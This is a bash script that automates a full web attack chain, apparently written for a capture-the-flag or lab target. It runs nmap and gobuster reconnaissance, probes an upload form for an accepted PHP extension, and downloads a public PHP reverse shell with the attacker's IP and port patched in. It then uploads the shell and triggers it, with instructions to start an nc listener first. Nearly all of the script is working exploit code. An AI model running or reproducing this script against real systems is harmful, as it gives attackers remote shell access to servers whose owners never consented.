#!/bin/bash

gobust_dir () {
	HOST=$1
	PORT=$2
	DIR=$3

	RES='./gobuster'
	if [[ ! -e $RES ]]; then
		mkdir $RES
	fi

	# Use GoBuster to find hidden directories
	WL=/usr/share/wordlists/dirb/common.txt
	RES_F="$RES/dir-$HOST-$DIR.txt"
	if [[ ! -e $RES_F ]]; then
		gobuster dir -q -u http://$HOST:$PORT/$DIR -w $WL -o $RES_F
	fi
	cat $RES_F | cut -d' ' -f 1
}

nmap_services () {
	HOST=$1

	RES='./nmap'
	if [[ ! -e $RES ]]; then
		mkdir $RES
	fi

	# Use GoBuster to find hidden directories
	# Look up for running services and it's versions
	RES_F="$RES/scan-$HOST.txt"
	if [[ ! -e $RES_F ]]; then
		nmap -sV $HOST -o $RES_F
	fi
	cat $RES_F | grep -P '\d+/\w+' | sed -E 's/(\s){2,}/\1/g'
}

if (( $# < 1 )); then
	echo "USAGE: $0 TARGET_HOST [MY_PORT_FOR_REVERSE_SHELL]
MY_PORT_FOR_REVERSE_SHELL - by default 6666"
	exit
fi

HOST=$1
MY_PORT=6666
if [[ -n "$2" ]]; then
	MY_PORT=$2
fi

# Look up for running services and it's versions. Search for http service in results.
echo "[NMAP] Searching for http ports"
PORT=$(nmap_services $HOST | grep -P 'open http\s' | cut -d/ -f 1)
if [[ -z $PORT ]]; then
	echo "[NMAP] Not found any port with http, aborting:
	$(nmap_services $HOST)"
	exit
fi
echo "[NMAP] Found http port: $PORT"

# Use GoBuster to find hidden directories inside target directory
INTERNAL_DIR='internal'
echo "[GOBUSTER] Searching for $INTERNAL_DIR in $HOST:$PORT"
if [[ ! "$(gobust_dir $HOST $PORT '')" =~ "$INTERNAL_DIR" ]]; then
	echo "[GOBUSTER] Not found $INTERNAL_DIR folder, aborting"
	exit
fi

UPLOADS_DIR='uploads'
echo "[GOBUSTER] Searching for $UPLOADS_DIR in $HOST:$PORT/$INTERNAL_DIR"
if [[ ! "$(gobust_dir $HOST $PORT $INTERNAL_DIR)" =~ "$UPLOADS_DIR" ]]; then
	echo "[GOBUSTER] Not found $UPLOADS_DIR folder, aborting"
	exit
fi

# Try to POST different files to figure out allowed extention
EXT_WL=(php php3 php4 php5 phtml)
EXT_F='temp_file.'
EXT_BUF_1=temp_buf1
EXT_BUF_2=temp_buf2
TARGET_EXT=''
touch $EXT_F
for e in ${EXT_WL[@]}; do
	mv $EXT_F* $EXT_F${e}
	curl -s http://$HOST:$PORT/${INTERNAL_DIR}/index.php -F file=@$EXT_F${e} -X POST -o $EXT_BUF_1
	if [[ -s $EXT_BUF_2 && -n $(diff -q $EXT_BUF_1 $EXT_BUF_2) ]]; then
		TARGET_EXT=$e
		break
	fi
	cp $EXT_BUF_1 $EXT_BUF_2
done
rm $EXT_F* $EXT_BUF_1 $EXT_BUF_2
if [[ -z $TARGET_EXT ]]; then
	echo '[CURL] Not found suitable extention'
	exit
fi
echo "[CURL] Found allowed extention $TARGET_EXT"

# Sending reverse shell script to server
REVSH_F="hack.$TARGET_EXT"
MY_IP=$(ip address show dev tun0 | grep -o -P 'inet\s[\d\.]+' | cut -d' ' -f 2)
if [[ ! -s $REVSH_F ]]; then
	curl -s https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -o $REVSH_F
fi
sed -E -i "s/(\\\$ip = ').+('.*)/\1$MY_IP\2/" $REVSH_F
sed -E -i "s/(\\\$port = ).+(;.*)/\1$MY_PORT\2/" $REVSH_F
curl -s http://$HOST:$PORT/$INTERNAL_DIR/index.php -F file=@$REVSH_F -X POST -o /dev/null
echo "[CURL] Uploaded reverse shell script $REVSH_F"

# Opening reverse shell
read -p "[REVSH] Please start NetCat in other window to receive reverse shell connection to current IP $MY_IP:

nc -lvnp $MY_PORT

[Press Enter when ready]"
REVSH_PATH="http://$HOST:$PORT/$INTERNAL_DIR/$UPLOADS_DIR/$REVSH_F"
echo "[CURL] Opening reverse shell from $REVSH_PATH"
curl $REVSH_PATH
